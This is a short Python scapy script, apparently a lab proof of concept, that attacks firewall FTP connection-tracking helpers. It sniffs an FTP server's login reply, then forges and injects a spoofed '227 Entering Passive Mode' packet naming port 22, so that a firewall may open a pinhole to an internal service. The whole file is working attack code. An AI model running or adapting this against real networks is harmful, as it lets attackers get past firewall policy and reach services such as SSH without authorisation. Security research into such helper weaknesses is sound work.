#! /usr/bin/env python
# Copyright 2011 Eric Leblond <eric@regit.org>

import sys
import re
from scapy.all import *

class attack_target:
    def __init__(self):
       self.ip = "192.168.2.2"
       self.port = "5432"
       self.iface="vboxnet0"
       self.sent = 0

class ftp_helper(attack_target):
    def build_227_command(self):
        return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)

    def build_filter(self):
        return "tcp and src host %s and src port 21" % (self.ip)

    def ftp_from_server_callback(self, pkt):
        # match for login ok
        print pkt.sprintf("%TCP.payload%")
        if self.sent == 0 and re.match("230",pkt.sprintf("%TCP.payload%")):
            print "Working on following base"
            print pkt.show()
            # set ether pkt src as dst
            orig_src = pkt[Ether].src
            orig_dst = pkt[Ether].dst
            # change payload
            att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
            att[IP] = pkt[IP]
            att[IP].id = pkt[IP].id + 1
            del att[IP].chksum
            del att[IP].len
            att[TCP].seq = pkt[TCP].seq + 48
            del att[TCP].chksum
            att[TCP].payload = self.build_227_command()
            # send packet
            print "Sending attack packet"
            print att.show()
            sendp(att, iface=self.iface)
            self.sent = 1

#sniff(iface="vboxnet0", prn=ftp_from_server_callback, filter="tcp and host 192.168.2.2 and port 21", store=0)
ftptarget = ftp_helper()
ftptarget.ip = "192.168.2.2"
ftptarget.port = 22

sniff(iface=ftptarget.iface, prn=ftptarget.ftp_from_server_callback, filter=ftptarget.build_filter(), store=0)
